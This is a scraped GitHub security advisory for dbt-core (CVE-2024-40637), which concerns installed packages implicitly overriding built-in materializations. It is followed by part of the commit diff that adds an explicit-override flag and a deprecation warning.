=== Content from github.com_79f47963_20250110_152648.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fsecurity%2Fadvisories%2FGHSA-p3f3-5ccg-83xq)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fsecurity%2Fadvisories%2FGHSA-p3f3-5ccg-83xq)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=dbt-labs%2Fdbt-core)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dbt-labs](/dbt-labs)
/
**[dbt-core](/dbt-labs/dbt-core)**
Public

* [Notifications](/login?return_to=%2Fdbt-labs%2Fdbt-core) You must be signed in to change notification settings
* [Fork
  1.7k](/login?return_to=%2Fdbt-labs%2Fdbt-core)
* [Star
   10.2k](/login?return_to=%2Fdbt-labs%2Fdbt-core)

* [Code](/dbt-labs/dbt-core)
* [Issues
  526](/dbt-labs/dbt-core/issues)
* [Pull requests
  102](/dbt-labs/dbt-core/pulls)
* [Discussions](/dbt-labs/dbt-core/discussions)
* [Actions](/dbt-labs/dbt-core/actions)
* [Wiki](/dbt-labs/dbt-core/wiki)
* [Security](/dbt-labs/dbt-core/security)
* [Insights](/dbt-labs/dbt-core/pulse)

Additional navigation options

* [Code](/dbt-labs/dbt-core)
* [Issues](/dbt-labs/dbt-core/issues)
* [Pull requests](/dbt-labs/dbt-core/pulls)
* [Discussions](/dbt-labs/dbt-core/discussions)
* [Actions](/dbt-labs/dbt-core/actions)
* [Wiki](/dbt-labs/dbt-core/wiki)
* [Security](/dbt-labs/dbt-core/security)
* [Insights](/dbt-labs/dbt-core/pulse)

# Implicit override for built-in materializations from installed packages

Moderate

[MichelleArk](/MichelleArk)
published
GHSA-p3f3-5ccg-83xq
Jul 16, 2024

## Package

dbt-core

## Affected versions

1.6, 1.7

## Patched versions

1.6.14, 1.7.14

## Description

### Impact

*What kind of vulnerability is it? Who is impacted?*

When a user installs a [package](https://docs.getdbt.com/docs/build/packages) in dbt, it has the ability to override macros, materializations, and other core components of dbt. This is by design, as it allows packages to extend and customize dbt's functionality. However, this also means that a malicious package could potentially override these components with harmful code.

### Patches

*Has the problem been patched? What versions should users upgrade to?*

Fixed on 1.8.0, and patched for 1.6.14 and 1.7.14 releases.

### Workarounds

*Is there a way for users to fix or remediate the vulnerability without upgrading?*

Previously, a materialization defined in a package that shared a name with one of the built-in materializations would be preferred by default, without user action which is surprising and makes it more difficult to detect the insecure behaviour. We've changed the default behaviour to require explicit overrides by users in `1.8.0`, and provided the ability to opt-out of built-in materialization overrides in 1.6 and 1.7 via the `flags.require_explicit_package_overrides_for_builtin_materializations: False` configuration in `dbt_project.yml`

Versions older than 1.6 are EOL.

### References

*Are there any links users can visit to find out more?*

* dbt documentation: <https://docs.getdbt.com/reference/global-configs/legacy-behaviors#behavior-change-flags>
* <https://www.elementary-data.com/post/are-dbt-packages-secure-the-answer-lies-in-your-dwh-policies>
* <https://www.equalexperts.com/blog/tech-focus/are-you-at-risk-from-this-critical-dbt-vulnerability/>
* <https://tempered.works/posts/2024/07/06/preventing-data-theft-with-gcp-service-controls/>

### Severity

Moderate

4.2

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
High

Privileges required
Low

User interaction
Required

Scope
Unchanged

Confidentiality
Low

Integrity
Low

Availability
Low

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:L

### CVE ID

CVE-2024-40637

### Weaknesses

No CWEs

### Credits

* [![@brabster](https://avatars.githubusercontent.com/u/38702?s=40&v=4)](/brabster)
  [brabster](/brabster)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5685f382_20250110_152646.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fcommit%2F3c82a0296d227cb1be295356df314c11716f4ff6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fcommit%2F3c82a0296d227cb1be295356df314c11716f4ff6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dbt-labs%2Fdbt-core)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dbt-labs](/dbt-labs)
/
**[dbt-core](/dbt-labs/dbt-core)**
Public

* [Notifications](/login?return_to=%2Fdbt-labs%2Fdbt-core) You must be signed in to change notification settings
* [Fork
  1.7k](/login?return_to=%2Fdbt-labs%2Fdbt-core)
* [Star
   10.2k](/login?return_to=%2Fdbt-labs%2Fdbt-core)

* [Code](/dbt-labs/dbt-core)
* [Issues
  526](/dbt-labs/dbt-core/issues)
* [Pull requests
  102](/dbt-labs/dbt-core/pulls)
* [Discussions](/dbt-labs/dbt-core/discussions)
* [Actions](/dbt-labs/dbt-core/actions)
* [Wiki](/dbt-labs/dbt-core/wiki)
* [Security](/dbt-labs/dbt-core/security)
* [Insights](/dbt-labs/dbt-core/pulse)

Additional navigation options

* [Code](/dbt-labs/dbt-core)
* [Issues](/dbt-labs/dbt-core/issues)
* [Pull requests](/dbt-labs/dbt-core/pulls)
* [Discussions](/dbt-labs/dbt-core/discussions)
* [Actions](/dbt-labs/dbt-core/actions)
* [Wiki](/dbt-labs/dbt-core/wiki)
* [Security](/dbt-labs/dbt-core/security)
* [Insights](/dbt-labs/dbt-core/pulse)

## Commit

[Permalink](/dbt-labs/dbt-core/commit/3c82a0296d227cb1be295356df314c11716f4ff6)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

deprecate materialization overrides from imported packages ([#9971](https://github.com/dbt-labs/dbt-core/pull/9971)) ([#…](https://github.com/dbt-labs/dbt-core/pull/10008)

[Browse files](/dbt-labs/dbt-core/tree/3c82a0296d227cb1be295356df314c11716f4ff6)
Browse the repository at this point in the history

```
[…10008](https://github.com/dbt-labs/dbt-core/pull/10008))
```

* Loading branch information

[![@MichelleArk](https://avatars.githubusercontent.com/u/9407260?s=40&v=4)](/MichelleArk)

[MichelleArk](/dbt-labs/dbt-core/commits?author=MichelleArk "View all commits by MichelleArk")
authored
May 1, 2024

1 parent
[ce483b6](/dbt-labs/dbt-core/commit/ce483b600785cc77e7094a56ff05000dd918300a)

commit 3c82a02

 Show file tree

 Hide file tree

Showing
**39 changed files**
with
**1,737 additions**
and
**1,514 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* .changes/unreleased

  + .changes/unreleased/Features-20231218-195854.yaml
    [Features-20231218-195854.yaml](#diff-4a35df33f9c4a8b9c142efef6820f3527e0cec3726f2c758cfa605ddd9a2b50c)
  + .changes/unreleased/Features-20240422-173703.yaml
    [Features-20240422-173703.yaml](#diff-a859b37004f7c5a78d1a108c003c1a2d9736360574bee8d207c25181afc53d57)
  + .changes/unreleased/Under the Hood-20240418-172528.yaml
    [Under the Hood-20240418-172528.yaml](#diff-5e2cf3b0f0521399771285fe188c55228de626c5533e4f06cbaade7e372ea1ec)
* core/dbt

  + cli

    - core/dbt/cli/flags.py
      [flags.py](#diff-3e5c2add494f2ffa25c42dd0ea6ea0d4cc43875474b110506dff44385adb81ac)
  + config

    - core/dbt/config/\_\_init\_\_.py
      [\_\_init\_\_.py](#diff-a2ba8d46e3d69f8874c4c46f0d6a1d413f70879c405f82230e63d7c2bdb255be)
    - core/dbt/config/profile.py
      [profile.py](#diff-5231952f5e1234a0ee90a5f124a45ca1ebb429a9d606c76d01b2a32707d068cc)
    - core/dbt/config/project.py
      [project.py](#diff-8dc87da2257e24092820e0b29ea50eb16f002dd2c30b5879602b9311941858c0)
    - core/dbt/config/runtime.py
      [runtime.py](#diff-7685e44a07e8211f0e710116a07186168af0feb2e466fb46e40504d6b2282ec1)
  + core/dbt/constants.py
    [constants.py](#diff-e36a84d73d7faef4500c002885a3f4cd293adf5206caa167bdb09ffdf05037d6)
  + contracts

    - core/dbt/contracts/connection.py
      [connection.py](#diff-b55d5ef96b8e7bb12401faa41c400f3f0ae07420483e3364f395fee85ad0a7d9)
    - graph

      * core/dbt/contracts/graph/manifest.py
        [manifest.py](#diff-1e80746bd25a5ea5ca6604030a2991dfbae0e486f971a6665f2b3a3512f05532)
    - core/dbt/contracts/project.py
      [project.py](#diff-b9f683ce224d6624bcea9a769ca6ad072c9206feb7df48a46340f8148ed87652)
  + core/dbt/deprecations.py
    [deprecations.py](#diff-3277eb602a187d7bfbcb01f646fa8a17697750aa5886869fddaea6c3026f03e1)
  + events

    - core/dbt/events/types.proto
      [types.proto](#diff-b156ebbbf8a9c444e70458528aa309da2229cdf139816385b81a9272399a0b46)
    - core/dbt/events/types.py
      [types.py](#diff-a307286f8c93d8a9dbf3a863a62a6b712921d15f6b4cf9d885b15a45be68f05a)
    - core/dbt/events/types\_pb2.py
      [types\_pb2.py](#diff-ca7bf06d149002b2ab8c076a5cd6c2ed421baa4690078295bf7dd5ec8a3ed0d2)
  + core/dbt/flags.py
    [flags.py](#diff-b99c74c2d09fa1ea054aa843fa3738bd7c9d39acb9c5b90ca920f0e1fcf38010)
  + include/starter\_project

    - core/dbt/include/starter\_project/dbt\_project.yml
      [dbt\_project.yml](#diff-9901b50e28841b4f5b721d454e6440a69976e7c9f4da2e79605f730ad2dc1e02)
  + tests/fixtures

    - core/dbt/tests/fixtures/project.py
      [project.py](#diff-5bab13c218ba16b33ff49936fb3b417cce1da20f705a4010d3e07d566100428c)
  + core/dbt/tracking.py
    [tracking.py](#diff-b67ce24493704fffa7a17d3f9ac9aa6a9928da0faa9c6067678a347d5bbdad91)
  + core/dbt/utils.py
    [utils.py](#diff-3113975fdb70cadc0c7b5f58d67b41fb50b7819a848b8244bb50d32e959d9f7f)
* tests

  + functional

    - basic

      * tests/functional/basic/test\_mixed\_case\_db.py
        [test\_mixed\_case\_db.py](#diff-d89f3f01175d657410596cc97e8a21ac2b68203e279e3a68b29d8889091542d8)
      * tests/functional/basic/test\_project.py
        [test\_project.py](#diff-74a7cf655824c967999890bee179e63b9063ac03ee336bbef0143f10e3ae8721)
    - configs

      * tests/functional/configs/test\_disabled\_configs.py
        [test\_disabled\_configs.py](#diff-48069bf80479bcce7a646cb4bfdb20f580074526a92c1b8a4e821609d26e2ee6)
    - dependencies

      * tests/functional/dependencies/test\_local\_dependency.py
        [test\_local\_dependency.py](#diff-4f5f78d9b3b6f6eda81916de152b5c17b9d1ef14e40b7a2031c4d10f601d6474)
    - deprecations

      * tests/functional/deprecations/test\_deprecations.py
        [test\_deprecations.py](#diff-5986b4f4b57fa3266d0f74f111101d4739fd736c858296b144f346005dfce495)
    - fail\_fast

      * tests/functional/fail\_fast/test\_fail\_fast\_run.py
        [test\_fail\_fast\_run.py](#diff-dc6f658511fecc56ae9215ef69aa07f4943da24dc2ec40b43da1cdda9e14e325)
    - init

      * tests/functional/init/test\_init.py
        [test\_init.py](#diff-e006c8f2447fb1e5cadad42706f6eb63acca642891c2e9749458e2031f35f0e5)
    - materializations

      * tests/functional/materializations/conftest.py
        [conftest.py](#diff-f83b97f48c96f6fe2f605434f413399869881b5c0855918e8b13162eeff90265)
      * tests/functional/materializations/test\_custom\_materialization.py
        [test\_custom\_materialization.py](#diff-f7ef628400f15d5875fd9c736b29e855b4bf942565854434fd14aeee1ee61d5d)
    - metrics

      * tests/functional/metrics/test\_metric\_deferral.py
        [test\_metric\_deferral.py](#diff-4d53d74d2d5e9c61f50d0ecc8e6c5dffea927b8e1f2ea0bd8febebb76ad6cd05)
    - run\_operations

      * tests/functional/run\_operations/test\_run\_operations.py
        [test\_run\_operations.py](#diff-4f01239a19ba49190ed8f12eb1d0df78d89ae89b2145f428615946801b335c43)
  + unit

    - tests/unit/test\_cli\_flags.py
      [test\_cli\_flags.py](#diff-a0d0e2e52e7dc98051466b0fb10fbc6891c2c014c964de159e6c688f76aa376e)
    - tests/unit/test\_config.py
      [test\_config.py](#diff-217a439192bc495c66132a58a1bf7a92ee70f0eb9702c6b00f60644e726479b5)
    - tests/unit/test\_events.py
      [test\_events.py](#diff-018e6871938b17be4afa923d354aad1059ace4f5d0c88eceaa29711e62171289)
    - tests/unit/test\_flags.py
      [test\_flags.py](#diff-99174253f160fb3d1e4ea9c5f35a0b75d53c882cce44284146ba7beea65f7184)
    - tests/unit/test\_graph.py
      [test\_graph.py](#diff-21f7dbaa90f66a1b158cd577efb2282a0e6d1f70ff840e8a0547b3a32f2b0f29)
    - tests/unit/test\_graph\_selection.py
      [test\_graph\_selection.py](#diff-5e7c2fb541bfa11c046974f42f5b09fa6081e0a864a3f9731899d7691fb8eb52)
    - tests/unit/test\_manifest.py
      [test\_manifest.py](#diff-b177cd7874fea9116510fc5a6770c8d26dfe7e7b92b7b529ca89bd588d26a81d)

## There are no files selected for viewing

6 changes: 6 additions & 0 deletions

6
[.changes/unreleased/Features-20231218-195854.yaml](#diff-4a35df33f9c4a8b9c142efef6820f3527e0cec3726f2c758cfa605ddd9a2b50c ".changes/unreleased/Features-20231218-195854.yaml")

Show comments

[View file](/dbt-labs/dbt-core/blob/3c82a0296d227cb1be295356df314c11716f4ff6/.changes/unreleased/Features-20231218-195854.yaml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | kind: Features |
|  |  | body: Move flags from UserConfig in profiles.yml to flags in dbt\_project.yml |
|  |  | time: 2023-12-18T19:58:54.075811-05:00 |
|  |  | custom: |
|  |  | Author: gshank |
|  |  | Issue: "9183" |

6 changes: 6 additions & 0 deletions

6
[.changes/unreleased/Features-20240422-173703.yaml](#diff-a859b37004f7c5a78d1a108c003c1a2d9736360574bee8d207c25181afc53d57 ".changes/unreleased/Features-20240422-173703.yaml")

Show comments

[View file](/dbt-labs/dbt-core/blob/3c82a0296d227cb1be295356df314c11716f4ff6/.changes/unreleased/Features-20240422-173703.yaml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | kind: Features |
|  |  | body: Add require\_explicit\_package\_overrides\_for\_builtin\_materializations to dbt\_project.yml flags, which can be used to opt-out of overriding built-in materializations from packages |
|  |  | time: 2024-04-22T17:37:03.892268-04:00 |
|  |  | custom: |
|  |  | Author: michelleark |
|  |  | Issue: "10007" |

6 changes: 6 additions & 0 deletions

6
[.changes/unreleased/Under the Hood-20240418-172528.yaml](#diff-5e2cf3b0f0521399771285fe188c55228de626c5533e4f06cbaade7e372ea1ec ".changes/unreleased/Under the Hood-20240418-172528.yaml")

Show comments

[View file](/dbt-labs/dbt-core/blob/3c82a0296d227cb1be295356df314c11716f4ff6/.changes/unreleased/Under%20the%20Hood-20240418-172528.yaml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,6 @@ |
|  |  | kind: Under the Hood |
|  |  | body: Raise deprecation warning if installed package overrides built-in materialization |
|  |  | time: 2024-04-18T17:25:28.37886-04:00 |
|  |  | custom: |
|  |  | Author: michelleark |
|  |  | Issue: "9971" |

43 changes: 30 additions & 13 deletions

43
[core/dbt/cli/flags.py](#diff-3e5c2add494f2ffa25c42dd0ea6ea0d4cc43875474b110506dff44385adb81ac "core/dbt/cli/flags.py")

Show comments

[View file](/dbt-labs/dbt-core/blob/3c82a0296d227cb1be295356df314c11716f4ff6/core/dbt/cli/flags.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,6 +3,7 @@ |
|  |  | from dataclasses import dataclass |
|  |  | from importlib import import\_module |
|  |  | from multiprocessing import get\_context |
|  |  | from pathlib import Path |
|  |  | from pprint import pformat as pf |
|  |  | from typing import Any, Callable, Dict, List, Optional, Set, Union |
|  |  |  |
| Expand All | | @@ -11,8 +12,8 @@ |
|  |  | from dbt.cli.exceptions import DbtUsageException |
|  |  | from dbt.cli.resolvers import default\_log\_path, default\_project\_dir |
|  |  | from dbt.cli.types import Command as CliCommand |
|  |  | from dbt.config.profile import read\_user\_config |
|  |  | from dbt.contracts.project import UserConfig |
|  |  | from dbt.config.project import read\_project\_flags |
|  |  | from dbt.contracts.project import ProjectFlags |
|  |  | from dbt.exceptions import DbtInternalError |
|  |  | from dbt.deprecations import renamed\_env\_var |
|  |  | from dbt.helper\_types import WarnErrorOptions |
| Expand All | | @@ -24,7 +25,8 @@ |
|  |  | FLAGS\_DEFAULTS = { |
|  |  | "INDIRECT\_SELECTION": "eager", |
|  |  | "TARGET\_PATH": None, |
|  |  | # Cli args without user\_config or env var option. |
|  |  | "WARN\_ERROR": None, |
|  |  | # Cli args without project\_flags or env var option. |
|  |  | "FULL\_REFRESH": False, |
|  |  | "STRICT\_MODE": False, |
|  |  | "STORE\_FAILURES": False, |
| Expand Down  Expand Up | | @@ -76,7 +78,7 @@ class Flags: |
|  |  | """Primary configuration artifact for running dbt""" |
|  |  |  |
|  |  | def \_\_init\_\_( |
|  |  | self, ctx: Optional[Context] = None, user\_config: Optional[UserConfig] = None |
|  |  | self, ctx: Optional[Context] = None, project\_flags: Optional[ProjectFlags] = None |
|  |  | ) -> None: |
|  |  |  |
|  |  | # Set the default flags. |
| Expand Down  Expand Up | | @@ -201,27 +203,40 @@ def \_assign\_params( |
|  |  | invoked\_subcommand\_ctx, params\_assigned\_from\_default, deprecated\_env\_vars |
|  |  | ) |
|  |  |  |
|  |  | if not user\_config: |
|  |  | if not project\_flags: |
|  |  | project\_dir = getattr(self, "PROJECT\_DIR", str(default\_project\_dir())) |
|  |  | profiles\_dir = getattr(self, "PROFILES\_DIR", None) |
|  |  | user\_config = read\_user\_config(profiles\_dir) if profiles\_dir else None |
|  |  | if profiles\_dir and project\_dir: |
|  |  | project\_flags = read\_project\_flags(project\_dir, profiles\_dir) |
|  |  | else: |
|  |  | project\_flags = None |
|  |  |  |
|  |  | # Add entire invocation command to flags |
|  |  | object.\_\_setattr\_\_(self, "INVOCATION\_COMMAND", "dbt " + " ".join(sys.argv[1:])) |
|  |  |  |
|  |  | # Overwrite default assignments with user config if available. |
|  |  | if user\_config: |
|  |  | if project\_flags: |
|  |  | # Overwrite default assignments with project flags if available. |
|  |  | param\_assigned\_from\_default\_copy = params\_assigned\_from\_default.copy() |
|  |  | for param\_assigned\_from\_default in params\_assigned\_from\_default: |
|  |  | user\_config\_param\_value = getattr(user\_config, param\_assigned\_from\_default, None) |
|  |  | if user\_config\_param\_value is not None: |
|  |  | project\_flags\_param\_value = getattr( |
|  |  | project\_flags, param\_assigned\_from\_default, None |
|  |  | ) |
|  |  | if project\_flags\_param\_value is not None: |
|  |  | object.\_\_setattr\_\_( |
|  |  | self, |
|  |  | param\_assigned\_from\_default.upper(), |
|  |  | convert\_config(param\_assigned\_from\_default, user\_config\_param\_value), |
|  |  | convert\_config(param\_assigned\_from\_default, project\_flags\_param\_value), |
|  |  | ) |
|  |  | param\_assigned\_from\_default\_copy.remove(param\_assigned\_from\_default) |
|  |  | params\_assigned\_from\_default = param\_assigned\_from\_default\_copy |
|  |  |  |
|  |  | # Add project-level flags that are not available as CLI options / env vars |
|  |  | for ( |
|  |  | project\_level\_flag\_name, |
|  |  | project\_level\_flag\_value, |
|  |  | ) in project\_flags.project\_only\_flags.items(): |
|  |  | object.\_\_setattr\_\_(self, project\_level\_flag\_name.upper(), project\_level\_flag\_value) |
|  |  |  |
|  |  | # Set hard coded flags. |
|  |  | object.\_\_setattr\_\_(self, "WHICH", invoked\_subcommand\_name or ctx.info\_name) |
|  |  | object.\_\_setattr\_\_(self, "MP\_CONTEXT", get\_context("spawn")) |
| Expand All | | @@ -235,9 +250,11 @@ def \_assign\_params( |
|  |  | # Starting in v1.5, if `log-path` is set in `dbt\_project.yml`, it will raise a deprecation warning, |
|  |  | # with the possibility of removing it in a future release. |
|  |  | if getattr(self, "LOG\_PATH", None) is None: |
|  |  | project\_dir = getattr(self, "PROJECT\_DIR", default\_project\_dir()) |
|  |  | project\_dir = getattr(self, "PROJECT\_DIR", str(default\_project\_dir())) |
|  |  | version\_check = getattr(self, "VERSION\_CHECK", True) |
|  |  | object.\_\_setattr\_\_(self, "LOG\_PATH", default\_log\_path(project\_dir, version\_check)) |
|  |  | object.\_\_setattr\_\_( |
|  |  | self, "LOG\_PATH", default\_log\_path(Path(project\_dir), version\_check) |
|  |  | ) |
|  |  |  |
|  |  | # Support console DO NOT TRACK initiative. |
|  |  | if os.getenv("DO\_NOT\_TRACK", "").lower() in ("1", "t", "true", "y", "yes"): |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[core/dbt/config/\_\_init\_\_.py](#diff-a2ba8d46e3d69f8874c4c46f0d6a1d413f70879c405f82230e63d7c2bdb255be "core/dbt/config/__init__.py")

Show comments

[View file](/dbt-labs/dbt-core/blob/3c82a0296d227cb1be295356df314c11716f4ff6/core/dbt/config/__init__.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | # all these are just exports, they need "noqa" so flake8 will not complain. |
|  |  | from .profile import Profile, read\_user\_config # noqa |
|  |  | from .profile import Profile # noqa |
|  |  | from .project import Project, IsFQNResource, PartialProject # noqa |
|  |  | from .runtime import RuntimeConfig # noqa |

39 changes: 1 addition & 38 deletions

39
[core/dbt/config/profile.py](#diff-5231952f5e1234a0ee90a5f124a45ca1ebb429a9d606c76d01b2a32707d068cc "core/dbt/config/profile.py")
